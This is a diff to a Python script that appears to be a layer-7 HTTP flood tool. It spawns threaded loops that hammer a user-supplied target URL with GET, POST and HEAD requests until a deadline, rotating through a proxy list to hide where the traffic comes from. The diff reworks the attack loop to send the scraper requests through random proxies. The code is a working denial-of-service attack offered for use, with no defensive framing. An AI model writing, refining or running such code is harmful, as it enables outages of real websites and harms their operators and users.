@@ -28,9 +28,7 @@ with open('ua.txt', 'r') as f1:
 
     useragents = f1.read().splitlines()
     
-headers = {
-        'User-Agent' : random.choice(useragents) + "\r\n" 
-}
+
 
 ############################################################################################################################################################################################################################
 def title():
@@ -77,24 +75,19 @@ def Launch(url, th, t):
 def Attack(url, until_datetime, scraper):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            s = requests.Session()
-            ff = str(random.choice(open('proxy.txt').readlines()))
-            s.proxies['http'] = 'http://' + ff
-            s.proxies['https'] = 'https://' + ff
-            scraper.get(url, timeout=5)
-            scraper.post(url, timeout=5)
-            scraper.head(url, timeout=5)
-            a = s.get(url, headers=headers)
-            print(f'get...    {a}')
-            aa = s.post(url, headers=headers, )
-            print(aa) 
-            print(f'post...     {aa}')
-            requests.head(url, headers=headers)
-            print("head...")            
-        except:
+            fsf = str(random.choice(open('proxy.txt').read().splitlines()))
+            ff = {"http": fsf}
+            scraper.get(url, timeout=5, proxies=ff)
+            scraper.post(url, timeout=5, proxies=ff)
+            scraper.head(url, timeout=5, proxies=ff)
+        except Exception as e:
+            print(e)
             pass
 title()			
 command = ("s")         
 if command == "s" or command == "s":
         target, thread, t = get_info_l7()
         Launch(target, thread, t)
+
+
+
